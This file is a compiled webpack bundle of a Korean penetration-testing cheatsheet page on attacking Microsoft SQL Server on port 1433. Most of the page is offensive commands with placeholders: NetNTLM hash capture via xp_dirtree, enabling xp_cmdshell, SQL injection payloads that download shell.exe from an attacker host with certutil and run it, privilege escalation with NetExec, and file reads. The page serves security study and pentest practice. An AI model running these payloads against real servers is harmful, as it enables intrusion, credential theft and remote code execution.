"use strict";(self.webpackChunkmy_docusaurus_website=self.webpackChunkmy_docusaurus_website||[]).push([[7485],{1952:(e,s,n)=>{n.r(s),n.d(s,{assets:()=>d,contentTitle:()=>i,default:()=>o,frontMatter:()=>c,metadata:()=>l,toc:()=>t});const l=JSON.parse('{"id":"Cheatsheet/services/mssql","title":"MSSQL - 1433","description":"\uae30\ubcf8 \uc815\ubcf4","source":"@site/docs/Cheatsheet/services/mssql.md","sourceDirName":"Cheatsheet/services","slug":"/Cheatsheet/services/mssql","permalink":"/my-docusaurus-page/Cheatsheet/services/mssql","draft":false,"unlisted":false,"tags":[],"version":"current","sidebarPosition":7,"frontMatter":{"sidebar_position":7},"sidebar":"tutorialSidebar","previous":{"title":"SMB - 445","permalink":"/my-docusaurus-page/Cheatsheet/services/smb"},"next":{"title":"NFS - 2049","permalink":"/my-docusaurus-page/Cheatsheet/services/nfs"}}');var r=n(4848),a=n(8453);const c={sidebar_position:7},i="MSSQL - 1433",d={},t=[{value:"\uae30\ubcf8 \uc815\ubcf4",id:"\uae30\ubcf8-\uc815\ubcf4",level:2},{value:"\uc5f0\uacb0",id:"\uc5f0\uacb0",level:2},{value:"\uae30\ubcf8 \uba85\ub839\uc5b4",id:"\uae30\ubcf8-\uba85\ub839\uc5b4",level:2},{value:"\ub370\uc774\ud130\ubca0\uc774\uc2a4 \ub0b4\uc6a9 \ud45c\uc2dc",id:"\ub370\uc774\ud130\ubca0\uc774\uc2a4-\ub0b4\uc6a9-\ud45c\uc2dc",level:3},{value:"OPENQUERY",id:"openquery",level:2},{value:"\ubc14\uc774\ub108\ub9ac \ucd94\ucd9c (Base64)",id:"\ubc14\uc774\ub108\ub9ac-\ucd94\ucd9c-base64",level:2},{value:"NetNTLM Hash \ud0c8\ucde8 / Relay \uacf5\uaca9",id:"netntlm-hash-\ud0c8\ucde8--relay-\uacf5\uaca9",level:2},{value:"Linked SQL Server \uc5f4\uac70",id:"linked-sql-server-\uc5f4\uac70",level:2},{value:"xp_cmdshell",id:"xp_cmdshell",level:2},{value:"xp_cmdshell \ud65c\uc131\ud654 \ubc0f \uc0ac\uc6a9",id:"xp_cmdshell-\ud65c\uc131\ud654-\ubc0f-\uc0ac\uc6a9",level:3},{value:"SQL Injection\uc744 \ud1b5\ud55c xp_cmdshell",id:"sql-injection\uc744-\ud1b5\ud55c-xp_cmdshell",level:3},{value:"OPENROWSET\ub85c \ud30c\uc77c \uc77d\uae30/\uc4f0\uae30",id:"openrowset\ub85c-\ud30c\uc77c-\uc77d\uae30\uc4f0\uae30",level:2},{value:"NetExec",id:"netexec",level:2},{value:"RID \ube0c\ub8e8\ud2b8\ud3ec\uc2a4",id:"rid-\ube0c\ub8e8\ud2b8\ud3ec\uc2a4",level:3},{value:"\uad8c\ud55c \uc0c1\uc2b9",id:"\uad8c\ud55c-\uc0c1\uc2b9",level:3},{value:"\uba85\ub839 \uc2e4\ud589",id:"\uba85\ub839-\uc2e4\ud589",level:3},{value:"\ud30c\uc77c \ucc98\ub9ac",id:"\ud30c\uc77c-\ucc98\ub9ac",level:3},{value:"Nmap",id:"nmap",level:2},{value:"\ucc38\uace0",id:"\ucc38\uace0",level:2}];function h(e){const s={code:"code",h1:"h1",h2:"h2",h3:"h3",header:"header",li:"li",p:"p",pre:"pre",strong:"strong",ul:"ul",...(0,a.R)(),...e.components};return(0,r.jsxs)(r.Fragment,{children:[(0,r.jsx)(s.header,{children:(0,r.jsx)(s.h1,{id:"mssql---1433",children:"MSSQL - 1433"})}),"\n",(0,r.jsx)(s.h2,{id:"\uae30\ubcf8-\uc815\ubcf4",children:"\uae30\ubcf8 \uc815\ubcf4"}),"\n",(0,r.jsxs)(s.p,{children:[(0,r.jsx)(s.strong,{children:"\ud3ec\ud2b8"}),": 1433"]}),"\n",(0,r.jsx)(s.p,{children:"Microsoft SQL Server\ub294 Microsoft\uc758 \uad00\uacc4\ud615 \ub370\uc774\ud130\ubca0\uc774\uc2a4 \uad00\ub9ac \uc2dc\uc2a4\ud15c\uc785\ub2c8\ub2e4."}),"\n",(0,r.jsx)(s.h2,{id:"\uc5f0\uacb0",children:"\uc5f0\uacb0"}),"\n",(0,r.jsx)(s.pre,{children:(0,r.jsx)(s.code,{className:"language-bash",children:"# sqlcmd\nsqlcmd -S <RHOST> -U <USERNAME> -P '<PASSWORD>'\n\n# impacket-mssqlclient\nimpacket-mssqlclient <USERNAME>:<PASSWORD>@<RHOST> -windows-auth\n"})}),"\n",(0,r.jsx)(s.h2,{id:"\uae30\ubcf8-\uba85\ub839\uc5b4",children:"\uae30\ubcf8 \uba85\ub839\uc5b4"}),"\n",(0,r.jsx)(s.pre,{children:(0,r.jsx)(s.code,{className:"language-sql",children:"-- \ubc84\uc804 \ud655\uc778\nSELECT @@version;\n\n-- \ub370\uc774\ud130\ubca0\uc774\uc2a4 \ubaa9\ub85d\nSELECT name FROM sys.databases;\nSELECT name FROM master.sys.databases;\n\n-- \ud14c\uc774\ube14 \ubaa9\ub85d\nSELECT * FROM <DATABASE>.information_schema.tables;\n\n-- \ud14c\uc774\ube14 \ub0b4\uc6a9 \uc870\ud68c\nSELECT * FROM <DATABASE>.dbo.users;\n"})}),"\n",(0,r.jsx)(s.h3,{id:"\ub370\uc774\ud130\ubca0\uc774\uc2a4-\ub0b4\uc6a9-\ud45c\uc2dc",children:"\ub370\uc774\ud130\ubca0\uc774\uc2a4 \ub0b4\uc6a9 \ud45c\uc2dc"}),"\n",(0,r.jsx)(s.pre,{children:(0,r.jsx)(s.code,{className:"language-sql",children:"1> SELECT name FROM master.sys.databases\n2> go\n"})}),"\n",(0,r.jsx)(s.h2,{id:"openquery",children:"OPENQUERY"}),"\n",(0,r.jsx)(s.pre,{children:(0,r.jsx)(s.code,{className:"language-sql",children:"-- \ub370\uc774\ud130\ubca0\uc774\uc2a4 \uc870\ud68c\n1> select * from openquery(\"web\\clients\", 'select name from master.sys.databases');\n2> go\n\n-- \uac1d\uccb4 \uc870\ud68c\n1> select * from openquery(\"web\\clients\", 'select name from clients.sys.objects');\n2> go\n"})}),"\n",(0,r.jsx)(s.h2,{id:"\ubc14\uc774\ub108\ub9ac-\ucd94\ucd9c-base64",children:"\ubc14\uc774\ub108\ub9ac \ucd94\ucd9c (Base64)"}),"\n",(0,r.jsx)(s.pre,{children:(0,r.jsx)(s.code,{className:"language-sql",children:"1> select cast((select content from openquery([web\\clients], 'select * from clients.sys.assembly_files') where assembly_id = 65536) as varbinary(max)) for xml path(''), binary base64;\n2> go > export.txt\n"})}),"\n",(0,r.jsx)(s.h2,{id:"netntlm-hash-\ud0c8\ucde8--relay-\uacf5\uaca9",children:"NetNTLM Hash \ud0c8\ucde8 / Relay \uacf5\uaca9"}),"\n",(0,r.jsx)(s.pre,{children:(0,r.jsx)(s.code,{className:"language-sql",children:"SQL> exec master.dbo.xp_dirtree '\\\\<LHOST>\\FOOBAR'\n"})}),"\n",(0,r.jsx)(s.h2,{id:"linked-sql-server-\uc5f4\uac70",children:"Linked SQL Server \uc5f4\uac70"}),"\n",(0,r.jsx)(s.pre,{children:(0,r.jsx)(s.code,{className:"language-sql",children:"-- \ud604\uc7ac \uc0ac\uc6a9\uc790\nSQL> SELECT user_name();\n\n-- Sysadmin \ud655\uc778\nSQL> SELECT name,sysadmin FROM syslogins;\n\n-- \uc11c\ubc84 \ubaa9\ub85d\nSQL> SELECT srvname,isremote FROM sysservers;\n\n-- Linked Server\uc5d0\uc11c \uba85\ub839 \uc2e4\ud589\nSQL> EXEC ('SELECT current_user') at [<DOMAIN>\\<CONFIG_FILE>];\nSQL> EXEC ('SELECT srvname,isremote FROM sysservers') at [<DOMAIN>\\<CONFIG_FILE>];\nSQL> EXEC ('EXEC (''SELECT suser_name()'') at [<DOMAIN>\\<CONFIG_FILE>]') at [<DOMAIN>\\<CONFIG_FILE>];\n"})}),"\n",(0,r.jsx)(s.h2,{id:"xp_cmdshell",children:"xp_cmdshell"}),"\n",(0,r.jsx)(s.h3,{id:"xp_cmdshell-\ud65c\uc131\ud654-\ubc0f-\uc0ac\uc6a9",children:"xp_cmdshell \ud65c\uc131\ud654 \ubc0f \uc0ac\uc6a9"}),"\n",(0,r.jsx)(s.pre,{children:(0,r.jsx)(s.code,{className:"language-sql",children:"-- \ubc29\ubc95 1\nSQL> EXECUTE AS LOGIN = 'sa';\nSQL> EXEC sp_configure 'Show Advanced Options', 1;\nSQL> RECONFIGURE;\nSQL> EXEC sp_configure 'xp_cmdshell', 1;\nSQL> RECONFIGURE;\nSQL> EXEC xp_cmdshell 'dir';\n\n-- \ubc29\ubc95 2\nSQL> EXEC sp_configure 'Show Advanced Options', 1;\nSQL> reconfigure;\nSQL> sp_configure;\nSQL> EXEC sp_configure 'xp_cmdshell', 1;\nSQL> reconfigure;\nSQL> xp_cmdshell \"whoami\";\n\n-- \ubc29\ubc95 3 (impacket-mssqlclient)\nSQL> enable_xp_cmdshell\nSQL> xp_cmdshell whoami\n"})}),"\n",(0,r.jsx)(s.h3,{id:"sql-injection\uc744-\ud1b5\ud55c-xp_cmdshell",children:"SQL Injection\uc744 \ud1b5\ud55c xp_cmdshell"}),"\n",(0,r.jsx)(s.pre,{children:(0,r.jsx)(s.code,{className:"language-sql",children:"-- Ping\n';EXEC master.dbo.xp_cmdshell 'ping <LHOST>';--\n\n-- \ud30c\uc77c \ub2e4\uc6b4\ub85c\ub4dc\n';EXEC master.dbo.xp_cmdshell 'certutil -urlcache -split -f http://<LHOST>/shell.exe C:\\\\Windows\\temp\\<FILE>.exe';--\n\n-- \uc2e4\ud589\n';EXEC master.dbo.xp_cmdshell 'cmd /c C:\\\\Windows\\\\temp\\\\<FILE>.exe';--\n"})}),"\n",(0,r.jsx)(s.h2,{id:"openrowset\ub85c-\ud30c\uc77c-\uc77d\uae30\uc4f0\uae30",children:"OPENROWSET\ub85c \ud30c\uc77c \uc77d\uae30/\uc4f0\uae30"}),"\n",(0,r.jsx)(s.pre,{children:(0,r.jsx)(s.code,{className:"language-sql",children:"-- \ud30c\uc77c \uc77d\uae30\nSELECT * FROM OPENROWSET(BULK 'C:\\PATH\\TO\\FILE\\<FILE>', SINGLE_CLOB) AS x;\n"})}),"\n",(0,r.jsx)(s.h2,{id:"netexec",children:"NetExec"}),"\n",(0,r.jsx)(s.h3,{id:"rid-\ube0c\ub8e8\ud2b8\ud3ec\uc2a4",children:"RID \ube0c\ub8e8\ud2b8\ud3ec\uc2a4"}),"\n",(0,r.jsx)(s.pre,{children:(0,r.jsx)(s.code,{className:"language-bash",children:"netexec mssql <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --rid-brute\n"})}),"\n",(0,r.jsx)(s.h3,{id:"\uad8c\ud55c-\uc0c1\uc2b9",children:"\uad8c\ud55c \uc0c1\uc2b9"}),"\n",(0,r.jsx)(s.pre,{children:(0,r.jsx)(s.code,{className:"language-bash",children:"# \uad8c\ud55c \ud655\uc778\nnetexec mssql <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -M mssql_priv\n\n# \uad8c\ud55c \uc0c1\uc2b9\nnetexec mssql <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -M mssql_priv -o ACTION=privesc\n\n# \ub864\ubc31\nnetexec mssql <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -M mssql_priv -o ACTION=rollback\n"})}),"\n",(0,r.jsx)(s.h3,{id:"\uba85\ub839-\uc2e4\ud589",children:"\uba85\ub839 \uc2e4\ud589"}),"\n",(0,r.jsx)(s.pre,{children:(0,r.jsx)(s.code,{className:"language-bash",children:"# OS \uba85\ub839 \uc2e4\ud589\nnetexec mssql <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --local-auth -x whoami\n\n# SQL \ucffc\ub9ac \uc2e4\ud589\nnetexec mssql <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --local-auth -q 'SELECT name FROM master.dbo.sysdatabases;'\n"})}),"\n",(0,r.jsx)(s.h3,{id:"\ud30c\uc77c-\ucc98\ub9ac",children:"\ud30c\uc77c \ucc98\ub9ac"}),"\n",(0,r.jsx)(s.pre,{children:(0,r.jsx)(s.code,{className:"language-bash",children:"# \ud30c\uc77c \ub2e4\uc6b4\ub85c\ub4dc\nnetexec mssql <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --get-file \\\\PATH\\\\TO\\FOLDER\\\\<FILE> /PATH/TO/FOLDER/<FILE>\n\n# \ud30c\uc77c \uc5c5\ub85c\ub4dc\nnetexec mssql <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --put-file /PATH/TO/FILE/<FILE> \\\\PATH\\\\TO\\FOLDER\\\\<FILE>\n"})}),"\n",(0,r.jsx)(s.h2,{id:"nmap",children:"Nmap"}),"\n",(0,r.jsx)(s.pre,{children:(0,r.jsx)(s.code,{className:"language-bash",children:"# MSSQL \ubc84\uc804 \ud655\uc778\nsudo nmap -p1433 -sV <RHOST>\n\n# MSSQL \uc815\ubcf4 \uc218\uc9d1\nsudo nmap -p1433 --script ms-sql-info <RHOST>\n\n# MSSQL \ube48 \ube44\ubc00\ubc88\ud638 \ud655\uc778\nsudo nmap -p1433 --script ms-sql-empty-password <RHOST>\n\n# MSSQL xp_cmdshell \ud655\uc778\nsudo nmap -p1433 --script ms-sql-xp-cmdshell --script-args mssql.username=<USERNAME>,mssql.password=<PASSWORD> <RHOST>\n"})}),"\n",(0,r.jsx)(s.h2,{id:"\ucc38\uace0",children:"\ucc38\uace0"}),"\n",(0,r.jsxs)(s.ul,{children:["\n",(0,r.jsx)(s.li,{children:"xp_cmdshell \ud65c\uc131\ud654 \uac00\ub2a5 \uc5ec\ubd80 \ud655\uc778"}),"\n",(0,r.jsx)(s.li,{children:"Linked Server\ub97c \ud1b5\ud55c \uba85\ub839 \uc2e4\ud589 \uccb4\uc778"}),"\n",(0,r.jsx)(s.li,{children:"NetNTLM Relay \uacf5\uaca9 \uac00\ub2a5"}),"\n",(0,r.jsx)(s.li,{children:"SQL Injection \uc2dc xp_cmdshell\ub85c RCE"}),"\n",(0,r.jsx)(s.li,{children:"sysadmin \uad8c\ud55c \ud655\uc778"}),"\n"]})]})}function o(e={}){const{wrapper:s}={...(0,a.R)(),...e.components};return s?(0,r.jsx)(s,{...e,children:(0,r.jsx)(h,{...e})}):h(e)}},8453:(e,s,n)=>{n.d(s,{R:()=>c,x:()=>i});var l=n(6540);const r={},a=l.createContext(r);function c(e){const s=l.useContext(a);return l.useMemo(function(){return"function"==typeof e?e(s):{...s,...e}},[s,e])}function i(e){let s;return s=e.disableParentContext?"function"==typeof e.components?e.components(r):e.components||r:c(e.components),l.createElement(a.Provider,{value:s},e.children)}}}]);